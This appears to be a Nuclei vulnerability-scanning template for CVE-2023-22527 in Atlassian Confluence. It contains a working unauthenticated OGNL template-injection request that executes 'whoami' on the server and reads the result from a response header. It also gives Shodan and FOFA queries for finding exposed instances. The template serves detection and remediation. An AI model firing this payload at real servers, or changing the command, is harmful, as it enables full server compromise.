http:
- extractors:
  - dsl:
    - x_vuln_check
    type: dsl
  matchers:
  - condition: and
    dsl:
    - x_vuln_check != ""
    - contains(to_lower(body), 'empty{name=')
    type: dsl
  raw:
  - 'POST /template/aui/text-inline.vm HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate, br

    Content-Type: application/x-www-form-urlencoded


    label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader(\u0027x_vuln_check\u0027,(new+freemarker.template.utility.Execute()).exec({"whoami"}))


    '
id: CVE-2023-22527
info:
  author: iamnooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:atlassian:confluence_data_center:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22527
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-74
    epss-percentile: 0.99958
    epss-score: 0.94363
  description: "A template injection vulnerability on older versions of Confluence\
    \ Data Center and Server allows an unauthenticated attacker to achieve RCE on\
    \ an affected instance. Customers using an affected version must take immediate\
    \ action.\nMost recent supported versions of Confluence Data Center and Server\
    \ are not affected by this vulnerability as it was ultimately mitigated during\
    \ regular version updates. However, Atlassian recommends that customers take care\
    \ to install the latest version to protect their instances from non-critical vulnerabilities\
    \ outlined in Atlassian\u2019s January Security Bulletin.\n"
  impact: 'Unauthenticated attackers can exploit template injection in the text-inline.vm
    endpoint to execute arbitrary system commands on Confluence servers and completely
    compromise Atlassian Confluence installations.

    '
  metadata:
    fofa-query: app="atlassian-confluence"
    max-request: 1
    product: confluence_data_center
    shodan-query:
    - http.component:"Atlassian Confluence"
    - http.component:"atlassian confluence"
    vendor: atlassian
  name: Atlassian Confluence - Remote Code Execution
  reference:
  - https://confluence.atlassian.com/pages/viewpage.action?pageId=1333335615
  - https://jira.atlassian.com/browse/CONFSERVER-93833
  - https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/
  - http://packetstormsecurity.com/files/176789/Atlassian-Confluence-SSTI-Injection.html
  - https://github.com/ramirezs4/Tips-and-tools-forensics---RS4
  remediation: 'Update Atlassian Confluence Data Center and Server to August 2023
    IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, or August
    2022 Patch 13 that mitigates the template injection vulnerability.

    '
  severity: critical
  tags: packetstorm,cve,cve2023,confluence,rce,ssti,kev,atlassian,vkev,vuln
